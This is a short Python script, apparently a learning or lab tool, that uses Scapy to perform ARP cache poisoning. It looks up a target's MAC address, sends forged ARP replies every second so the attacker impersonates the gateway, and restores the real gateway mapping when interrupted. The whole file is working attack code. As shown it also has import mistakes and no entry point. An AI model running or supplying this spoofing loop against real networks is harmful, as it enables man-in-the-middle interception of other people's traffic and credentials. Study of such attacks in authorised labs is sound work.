#!usr/bin/env python
import sys
import scapy.all
import os
import signal
import sys
import time



# Retreive mac address from a given IP address
def get_mac(ip_address,Interface):
    resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address), retry=2, timeout=7,iface=Interface)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# Simulate the ARP attack by sending periodic ARP frames that enable the host to impersonate the Gateway
def ArpAttack(target_ip,Interface,gateway_ip,gateway_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    target_mac=get_mac(target_ip,Interface)
    try:
        while True:
            sendp(Ether()/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),iface=Interface)
            time.sleep(1)

    except KeyboardInterrupt:
        print ("You stopped ARP poisining process")
        restore_network(target_ip,target_mac,gateway_ip,gateway_mac,Interface)
        



# After quiting the ARP attack mode we should restore the network in its previous state by sending
# multiple ARP frames to inform the target about the real Gateway addresses
def restore_network(target_ip,target_mac,gateway_ip,gateway_mac,Interface):
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5,iface=Interface)
